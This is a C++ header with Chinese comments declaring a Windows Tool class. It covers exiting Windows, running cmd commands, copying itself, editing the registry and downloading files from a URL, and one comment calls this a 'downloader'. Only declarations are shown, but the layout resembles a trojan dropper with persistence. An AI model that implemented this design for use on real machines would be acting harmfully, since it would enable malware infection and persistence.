#ifndef __TOOL_H__
#define  __TOOL_H__

#include <windows.h>
#include <stdlib.h>
#include <urlmon.h> /* 下载者要用到的头文件 */
#pragma comment(lib, "urlmon.lib") 

namespace LivLib
{
	/* 工具类 */
	class Tool
	{
	public:
		/* 退出系统 */
		static bool ExitWindow(UINT operate);
		/* 执行cmd命 */
		static void ExecuteCmd(char cmdBuffer[]);
		/* 复制自身 */
		static void CopyMyself(const char *copyFileName);
		/* 操作注册表 */
		static bool OperatRegedit(HKEY mainKey, LPCTSTR lpSubKey, REGSAM operat, LPCSTR itemName, char *programFileName);
		/* 从网址中下载 */
		static void Uploader(char *loadUrl, char *savePath);
	};
}

#endif


